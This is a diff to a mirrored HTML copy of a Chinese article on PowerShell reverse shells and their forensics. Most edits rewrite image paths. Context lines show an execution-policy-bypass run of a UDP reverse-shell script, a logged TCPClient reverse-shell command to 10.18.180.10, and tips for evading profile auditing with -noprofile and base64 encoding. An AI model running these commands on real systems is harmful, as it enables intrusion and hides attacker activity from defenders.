@@ -3,7 +3,7 @@
 			<head>
 			     <title>powershell各种反弹姿势以及取证（一） - mickey</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/6090">http://drops.wooyun.org/tips/6090</a></h1>
 				
@@ -37,7 +37,7 @@ D:\&gt;PowerShell.exe -ep Bypass -File d:\Invoke-PowerShellUdp.ps1
 
 <p>就会走不同的协议出来，我这里演示的是UDP协议的，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062503414812656.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015062503414812656.png" alt="enter image description here"></p>
 
 <p>要先监听端口，再反弹，否则会报错。</p>
 
@@ -87,13 +87,13 @@ CD D:\ $LogCommandHealthEvent = $true $LogCommandLifecycleEvent = $true
 <li>右键点击profile.ps1，一次点击“安全”->“高级”->“审核”，点“编译”按钮，添加用户“everyone”，开启如图所示的审核项</li>
 </ol>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062503414825886.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015062503414825886.png" alt="enter image description here"></p>
 
 <ol>
 <li>因为这样做以后，日志会变的很大，为了编码回滚覆盖，相应的增加下日志的容量，如图</li>
 </ol>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062503414883554.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015062503414883554.png" alt="enter image description here"></p>
 
 <p>怎么能绕过这种防护呢？因为他加了对profile.ps1的文件审核，所以通过修改或者移动/删除这个文件的策略是走不通的。</p>
 
@@ -105,7 +105,7 @@ CommandLine=$client = New-Object System.Net.Sockets.TCPClient("10.18.180.10",888
 
 <p>如图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150625/2015062503414840335.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015062503414840335.png" alt="enter image description here"></p>
 
 <p>刚开始我想通过-noprofile选项因该可以绕过这个限制，实践后发现不行，还是会在日志里看到，然后我又配合用-enc选项进行base64编码，操作如下：</p>
 
